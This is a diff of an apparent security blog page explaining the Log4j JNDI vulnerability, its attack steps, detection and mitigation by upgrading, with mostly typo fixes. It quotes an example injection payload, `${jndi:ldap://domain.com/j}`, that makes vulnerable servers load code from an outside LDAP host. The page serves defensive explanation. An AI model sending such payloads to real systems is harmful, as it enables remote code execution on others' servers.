@@ -200,8 +200,8 @@
                 <img src="img/blog/LOG4J.jpg" class="img-fluid" alt="Blog image"/>
                 <div class="blog-excerpt open-sans-font pb-5">
                     <h2>1. Introduction</h2>
-                    <p>The Log4J vulnerability is triggered by attackers inserting a JNDI lookup in a header field (likely to be logged) linking to a malicious server. After Log4j logs this string, the server is queried and gives directory information leading to the download and execution of a malicious java data class
-                    Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. Affected versions are 2.0 <= Apache log4j <= 2.14.1
+                    <p>The Log4J vulnerability is triggered by attackers inserting a JNDI lookup in a header field (likely to be logged) linking to a malicious server. 
+                        After Log4j logs this string, the server is queried and gives directory information leading to the download and execution of a malicious java data class Apache Log4j2 <=2.14.1 JNDI features used in the configuration, log messages, and parameters do not protect against attacker-controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled. From log4j 2.15.0, this behavior has been disabled by default. Affected versions are 2.0 <= Apache log4j <= 2.14.1 
                     </p>
                         <img src="img/blog/logj mindamap.jpeg" class="img-fluid" alt="JNDI-ATTACK"/>
                     <p>
@@ -218,11 +218,11 @@
                     
                    <h2>2.<u>How it works ( Detection )</u></h2>
                      <p> 
-1. An attacker inserts the JNDI lookup/payload anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
+1. An attacker inserts the JNDI lookup/payload an anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br><br>
 2. The payload is passed to log4j for logging.<br><br>
-3. Log4j interpolates the string and queries the malicious ldap server.<br><br>
-4. The ldap server responds with directory information that contains the malicious java class.<br><br>
-5. Java deserializes or download the malicious java class and execute it.<br><br>
+3. Log4j interpolates the string and queries the malicious LDAP server.<br><br>
+4. The LDAP server responds with directory information that contains the malicious java class.<br><br>
+5. Java deserializes or downloads the malicious java class and executes it.<br><br>
                     </p>
                  <h2>3.<u>Simple DNS Log Monitor Services</u></h2>
  <p> 
@@ -357,7 +357,7 @@ Ask admin/system team to run a search/grep command on all servers to spot any fi
 
     2. <b>PERMANENT MITIGATION</b><br>
 
-Version 2.17.0 of log4j has been released without the vulnerability. log4j-core.jar is available on Apache Log4j official page, You
+Version 2.17.0 of log4j has been released without the vulnerability. log4j-core.jar is available on APACHE Log4j official page, You
 can download it and update your system<br><br>
     
     3. <b>TEMPORARY MITIGATION</b><br>
